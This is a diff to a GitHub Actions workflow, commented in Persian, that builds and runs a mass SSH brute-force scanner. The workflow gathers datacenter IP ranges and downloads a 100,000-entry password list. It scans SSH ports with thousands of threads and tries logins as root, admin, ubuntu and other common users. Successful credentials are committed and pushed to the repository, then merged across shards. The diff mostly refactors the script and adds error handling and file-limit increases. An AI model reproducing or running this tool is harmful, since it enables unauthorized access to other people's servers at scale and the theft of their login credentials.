@@ -38,7 +38,7 @@ jobs:
           MAX_IPS: ${{ github.event.inputs.max_ips }}
         run: |
           cat > scanner.py << 'SCANNER_EOF'
-          import os, sys, json, asyncio, random, socket, time, concurrent.futures
+          import os, sys, json, asyncio, random, socket, time, concurrent.futures, traceback
           from pathlib import Path
           from datetime import datetime
           import asyncssh
@@ -55,130 +55,136 @@ jobs:
           CRED_FILE = f"found_creds_shard_{SHARD_ID}.txt"
           REPORT_FILE = f"scan_report_shard_{SHARD_ID}.txt"
 
-          with open('task_list.json') as f:
-              tasks = json.load(f)
-          my_task = tasks[SHARD_ID]
-          ips = my_task['ips']
-          passwords = my_task['passwords']
-
-          scan_start = time.time()
-          print(f'🔥 شارد {SHARD_ID}: {len(ips)} آیپی | {len(passwords)} پسورد | {TEST_THREADS} نخ')
-
-          # ===== اسکن پورت فوق‌سریع =====
-          ssh_targets = []
-          def check_ssh(ip, port):
+          def main():
               try:
-                  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                  sock.settimeout(0.15)
-                  result = sock.connect_ex((ip, port))
-                  sock.close()
-                  return (ip, port) if result == 0 else None
-              except: return None
+                  run()
+              except Exception as e:
+                  with open(f"error_shard_{SHARD_ID}.log", "w") as f:
+                      f.write(f"CRITICAL ERROR: {e}\n{traceback.format_exc()}")
+                  os.system(f"git add error_shard_{SHARD_ID}.log && git commit -m 'Shard {SHARD_ID} error' && git push 2>/dev/null || true")
+                  print(f"💥 خطای بحرانی: {e}")
+                  sys.exit(1)
 
-          with concurrent.futures.ThreadPoolExecutor(max_workers=2000) as executor:
-              futures = []
-              for ip in ips:
-                  for port in SSH_PORTS:
-                      futures.append(executor.submit(check_ssh, ip, port))
-              for future in concurrent.futures.as_completed(futures):
-                  res = future.result()
-                  if res:
-                      ssh_targets.append(res)
+          def run():
+              with open('task_list.json') as f:
+                  tasks = json.load(f)
+              my_task = tasks[SHARD_ID]
+              ips = my_task['ips']
+              passwords = my_task['passwords']
 
-          scan_time = time.time() - scan_start
-          print(f'✅ {len(ssh_targets)} سرور SSH در {scan_time:.1f} ثانیه پیدا شد')
-          
-          if not ssh_targets:
-              # نوشتن گزارش خالی
+              scan_start = time.time()
+              print(f'🔥 شارد {SHARD_ID}: {len(ips)} آیپی | {len(passwords)} پسورد | {TEST_THREADS} نخ')
+
+              ssh_targets = []
+              def check_ssh(ip, port):
+                  try:
+                      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                      sock.settimeout(0.15)
+                      result = sock.connect_ex((ip, port))
+                      sock.close()
+                      return (ip, port) if result == 0 else None
+                  except: return None
+
+              with concurrent.futures.ThreadPoolExecutor(max_workers=2000) as executor:
+                  futures = []
+                  for ip in ips:
+                      for port in SSH_PORTS:
+                          futures.append(executor.submit(check_ssh, ip, port))
+                  for future in concurrent.futures.as_completed(futures):
+                      res = future.result()
+                      if res:
+                          ssh_targets.append(res)
+
+              scan_time = time.time() - scan_start
+              print(f'✅ {len(ssh_targets)} سرور SSH در {scan_time:.1f} ثانیه پیدا شد')
+              
+              if not ssh_targets:
+                  with open(REPORT_FILE, 'w') as f:
+                      f.write(f"Shard {SHARD_ID} Report\nNo targets found\n")
+                  os.system(f'git add {REPORT_FILE} && git commit -m "Shard {SHARD_ID} empty" && git push 2>/dev/null || true')
+                  print('بدون هدف، پایان')
+                  return
+
+              usernames = ['root', 'admin', 'ubuntu', 'ec2-user', 'azureuser', 'centos', 'debian', 'vagrant', 'pi', 'oracle']
+              cache_file = Path('cache') / f'dominator_cache_shard_{SHARD_ID}.json'
+              cache_file.parent.mkdir(exist_ok=True)
+              cache = json.load(open(cache_file)) if cache_file.exists() else {}
+              successes = []
+
+              async def test_ssh(ip, port, user, pwd):
+                  cache_key = f'{ip}:{port}:{user}:{pwd}'
+                  if cache_key in cache:
+                      return (ip, port, user, pwd, cache[cache_key])
+                  try:
+                      async with asyncssh.connect(ip, port=port, username=user, password=pwd,
+                                                  login_timeout=TIMEOUT, known_hosts=None) as conn:
+                          await conn.close()
+                      cache[cache_key] = 'SUCCESS'
+                      return (ip, port, user, pwd, 'SUCCESS')
+                  except:
+                      cache[cache_key] = 'FAILED'
+                      return (ip, port, user, pwd, 'FAILED')
+
+              async def attack_host(ip, port):
+                  local = []
+                  failed_pwds = set()
+                  sem = asyncio.Semaphore(TEST_THREADS)
+                  async def worker(user, pwd):
+                      if pwd in failed_pwds: return
+                      async with sem:
+                          res = await test_ssh(ip, port, user, pwd)
+                          if res[5] == 'SUCCESS':
+                              local.append(res)
+                              print(f'✅ {ip}:{port} {user}:{pwd}')
+                          else:
+                              failed_pwds.add(pwd)
+                  tasks = [worker(u, p) for u in usernames for p in passwords]
+                  await asyncio.gather(*tasks)
+                  return local
+
+              async def hunt():
+                  tasks = [attack_host(ip, port) for ip, port in ssh_targets]
+                  results = await asyncio.gather(*tasks)
+                  for r in results:
+                      successes.extend(r)
+
+              test_start = time.time()
+              asyncio.run(hunt())
+              test_time = time.time() - test_start
+
+              with open(CRED_FILE, 'w') as f:
+                  for ip, port, user, pwd, _ in successes:
+                      f.write(f'{ip}:{port}:{user}:{pwd}\n')
+              
+              with open(cache_file, 'w') as f:
+                  json.dump(cache, f)
+
               with open(REPORT_FILE, 'w') as f:
-                  f.write(f"Shard {SHARD_ID} Report\nNo targets found\n")
-              os.system(f'git add {REPORT_FILE} && git commit -m "Shard {SHARD_ID} empty" && git push 2>/dev/null || true')
-              print('بدون هدف، پایان')
-              sys.exit(0)
+                  f.write(f"Shard {SHARD_ID} Report\n")
+                  f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                  f.write(f"IPs Scanned: {len(ips)}\n")
+                  f.write(f"SSH Targets Found: {len(ssh_targets)}\n")
+                  f.write(f"Passwords Tested: {len(passwords)}\n")
+                  f.write(f"Credentials Found: {len(successes)}\n")
+                  f.write(f"Scan Time: {scan_time:.1f}s\n")
+                  f.write(f"Test Time: {test_time:.1f}s\n")
+                  f.write(f"Total Time: {scan_time+test_time:.1f}s\n")
+                  f.write("="*50 + "\n")
+                  for ip, port, user, pwd, _ in successes:
+                      f.write(f"{ip}:{port}:{user}:{pwd}\n")
 
-          # ===== تست اعتبارنامه فوق‌سریع =====
-          usernames = ['root', 'admin', 'ubuntu', 'ec2-user', 'azureuser', 'centos', 'debian', 'vagrant', 'pi', 'oracle']
-          cache_file = Path('cache') / f'dominator_cache_shard_{SHARD_ID}.json'
-          cache_file.parent.mkdir(exist_ok=True)
-          cache = json.load(open(cache_file)) if cache_file.exists() else {}
-          successes = []
+              os.system(f'git add {CRED_FILE} {REPORT_FILE} {cache_file} && git commit -m "Shard {SHARD_ID} complete" && git push 2>/dev/null || true')
+              total_time = time.time() - scan_start
+              print(f'📄 شارد {SHARD_ID} تمام شد. {len(successes)} پیدا شد. کل زمان: {total_time:.1f}s')
 
-          async def test_ssh(ip, port, user, pwd):
-              cache_key = f'{ip}:{port}:{user}:{pwd}'
-              if cache_key in cache:
-                  return (ip, port, user, pwd, cache[cache_key])
-              try:
-                  async with asyncssh.connect(ip, port=port, username=user, password=pwd,
-                                              login_timeout=TIMEOUT, known_hosts=None) as conn:
-                      await conn.close()
-                  cache[cache_key] = 'SUCCESS'
-                  return (ip, port, user, pwd, 'SUCCESS')
-              except:
-                  cache[cache_key] = 'FAILED'
-                  return (ip, port, user, pwd, 'FAILED')
-
-          async def attack_host(ip, port):
-              local = []
-              failed_pwds = set()
-              sem = asyncio.Semaphore(TEST_THREADS)
-              async def worker(user, pwd):
-                  if pwd in failed_pwds: return
-                  async with sem:
-                      res = await test_ssh(ip, port, user, pwd)
-                      if res[5] == 'SUCCESS':
-                          local.append(res)
-                          print(f'✅ {ip}:{port} {user}:{pwd}')
-                      else:
-                          failed_pwds.add(pwd)
-              tasks = [worker(u, p) for u in usernames for p in passwords]
-              await asyncio.gather(*tasks)
-              return local
-
-          async def main():
-              tasks = [attack_host(ip, port) for ip, port in ssh_targets]
-              results = await asyncio.gather(*tasks)
-              for r in results:
-                  successes.extend(r)
-
-          test_start = time.time()
-          asyncio.run(main())
-          test_time = time.time() - test_start
-
-          # ===== ذخیره نتایج =====
-          with open(CRED_FILE, 'w') as f:
-              for ip, port, user, pwd, _ in successes:
-                  f.write(f'{ip}:{port}:{user}:{pwd}\n')
-          
-          with open(cache_file, 'w') as f:
-              json.dump(cache, f)
-
-          # گزارش کامل
-          with open(REPORT_FILE, 'w') as f:
-              f.write(f"Shard {SHARD_ID} Report\n")
-              f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-              f.write(f"IPs Scanned: {len(ips)}\n")
-              f.write(f"SSH Targets Found: {len(ssh_targets)}\n")
-              f.write(f"Passwords Tested: {len(passwords)}\n")
-              f.write(f"Credentials Found: {len(successes)}\n")
-              f.write(f"Scan Time: {scan_time:.1f}s\n")
-              f.write(f"Test Time: {test_time:.1f}s\n")
-              f.write(f"Total Time: {scan_time+test_time:.1f}s\n")
-              f.write("="*50 + "\n")
-              for ip, port, user, pwd, _ in successes:
-                  f.write(f"{ip}:{port}:{user}:{pwd}\n")
-
-          os.system(f'git add {CRED_FILE} {REPORT_FILE} {cache_file} && git commit -m "Shard {SHARD_ID} complete" && git push 2>/dev/null || true')
-          
-          total_time = time.time() - scan_start
-          print(f'📄 شارد {SHARD_ID} تمام شد. {len(successes)} پیدا شد. کل زمان: {total_time:.1f}s')
+          main()
           SCANNER_EOF
           
-          # ساختن task_list.json با ۱۰۰ هزار پسورد
+          # ساختن task_list.json
           python3 -c "
           import os, json, random, ipaddress, requests
           SHARD_COUNT = int(os.environ['SHARD_COUNT'])
           MAX_IPS = int(os.environ['MAX_IPS'])
-          
           print('🌐 دریافت آیپی‌های دیتاسنتر...')
           datacenter_urls = []
           try:
@@ -210,11 +216,9 @@ jobs:
               except: pass
           ips = list(all_ips)[:MAX_IPS]
           print(f'✅ {len(ips)} آیپی')
-          
           print('⬇️ دانلود ۱۰۰K پسورد از SecLists...')
           passwords = ['password','123456','admin','root','12345678','qwerty']
           try:
-              # 100k passwords list
               resp = requests.get('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt', timeout=120)
               passwords = list(set([line.strip() for line in resp.text.splitlines() if line.strip()]))
               print(f'✅ {len(passwords)} پسورد')
@@ -224,8 +228,6 @@ jobs:
                   passwords = list(set([line.strip() for line in resp.text.splitlines() if line.strip()]))
                   print(f'⚠️ Fallback: {len(passwords)} پسورد')
               except: pass
-          
-          # تقسیم بین شاردها
           ip_chunk = len(ips) // SHARD_COUNT
           pwd_chunk = len(passwords) // SHARD_COUNT
           tasks = []
@@ -234,12 +236,7 @@ jobs:
               end_ip = start_ip + ip_chunk if i != SHARD_COUNT - 1 else len(ips)
               start_pwd = i * pwd_chunk
               end_pwd = start_pwd + pwd_chunk if i != SHARD_COUNT - 1 else len(passwords)
-              tasks.append({
-                  'shard': i,
-                  'ips': ips[start_ip:end_ip],
-                  'passwords': passwords[start_pwd:end_pwd]
-              })
-          
+              tasks.append({'shard': i, 'ips': ips[start_ip:end_ip], 'passwords': passwords[start_pwd:end_pwd]})
           with open('task_list.json','w') as f: json.dump(tasks, f)
           with open('indices.json','w') as f: json.dump(list(range(SHARD_COUNT)), f)
           print(f'✅ {len(tasks)} شارد ساخته شد')
@@ -273,12 +270,17 @@ jobs:
       - name: نصب وابستگی‌ها
         run: pip3 install asyncssh uvloop aiohttp
 
+      - name: افزایش محدودیت‌های سیستم
+        run: sudo ulimit -n 65536
+
       - name: اجرای اسکنر فوق‌سریع
         env:
           SHARD_ID: ${{ matrix.shard }}
           TEST_THREADS: ${{ github.event.inputs.test_threads }}
           TIMEOUT: ${{ github.event.inputs.timeout }}
-        run: python3 scanner.py
+        run: |
+          ulimit -n 65536
+          python3 scanner.py
 
   merge:
     needs: scan_shard
@@ -289,11 +291,9 @@ jobs:
       - name: ادغام نهایی
         run: |
           git pull origin main 2>/dev/null || true
-          
           echo "📊 جمع‌آوری نتایج..."
           cat found_creds_shard_*.txt > final_creds.txt 2>/dev/null || echo "بدون نتیجه"
           cat scan_report_shard_*.txt > full_scan_report.txt 2>/dev/null || echo "بدون گزارش"
-          
           if [ -s final_creds.txt ]; then
             total=$(wc -l < final_creds.txt)
             echo "✅ $total اعتبارنامه پیدا شد:"
@@ -301,7 +301,6 @@ jobs:
           else
             echo "❌ هیچ اعتبارنامه‌ای پیدا نشد"
           fi
-          
           git add final_creds.txt full_scan_report.txt
           git commit -m "Merge all shards - final results" || true
           git push || true
